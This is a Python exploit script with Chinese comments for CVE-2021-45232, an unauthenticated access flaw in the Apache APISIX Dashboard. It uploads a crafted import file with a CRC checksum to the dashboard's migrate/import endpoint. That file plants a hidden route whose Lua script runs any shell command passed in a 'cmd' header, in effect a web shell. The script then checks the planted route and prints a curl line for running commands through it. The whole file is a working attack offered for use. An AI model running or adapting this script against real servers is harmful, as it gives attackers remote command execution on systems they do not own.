# EXP CVE-2021-45232  apache apisix Dashboard 未授权漏洞   
# TODO 可将用户传入的url设置为参数
from operator import truth
import re
from termios import VINTR
import zlib
import requests
import json
import random
import string


# 随机生成路由名
ran_char = ''.join(random.choices(string.ascii_letters + string.digits, k=6)) 

# 上传数据
data = {
    "Counsumers": [],
    "Routes": [
        {
            "id": str(random.randint(100000000000000000, 1000000000000000000)),
            "create_time": 1640674554,
            "update_time": 1640677637,
            "uris": [
                f"/{ran_char}"
            ],
            "name": f"{ran_char}",
            "methods": [
                "GET",
                "POST",
                "PUT",
                "DELETE",
                "PATCH",
                "HEAD",
                "OPTIONS",
                "CONNECT",
                "TRACE"
            ],
            "script": "local file = io.popen(ngx.req.get_headers()['cmd'],'r') \n local output = file:read('*all') \n file:close() \n ngx.say(output)",
            "status": 1
        }
    ],
    "Services": [],
    "SSLs": [],
    "Upstreams": [],
    "Scripts": [],
    "GlobalPlugins": [],
    "PluginConfigs": []
}

# 计算校验值
def calc_crc(data):
    crc32 = zlib.crc32(data) & 0xffffffff
    return crc32.to_bytes(4, byteorder="big")

def import_exp(url,data):
    # url拼接
    urls = url + "/apisix/admin/migrate/import"
    json_data = json.dumps(data).encode()              # 上传json格式数据
    upload_data = json_data +  calc_crc(json_data)      # 生成校验值

    # 利用文件上传
    files = {"file":('data',upload_data,"text/data")}

    try:
        res = requests.post(urls,files=files,timeout=3)
    except:
        return "url错误或者请求超时"
    if  res.status_code ==200 and res.json().get("code",-1) == 0  :
        auth_url = url[0:-2]+"80"+f"/{ran_char}"
        resp  = requests.get(auth_url) 
        if resp.status_code == 500 and re.search("An error occurred.",resp.text):
            res.close()
            resp.close()
            return(f"上传成功,命令行输入 ：curl http://127.0.0.1:9080/{ran_char} -H 'cmd:ls' ")
        else:
            res.close()
            resp.close()
            return("上传失败")
       
    else   :
        res.close()
        return("上传失败")
        
url = "http://127.0.0.1:9000"
print(import_exp(url,data))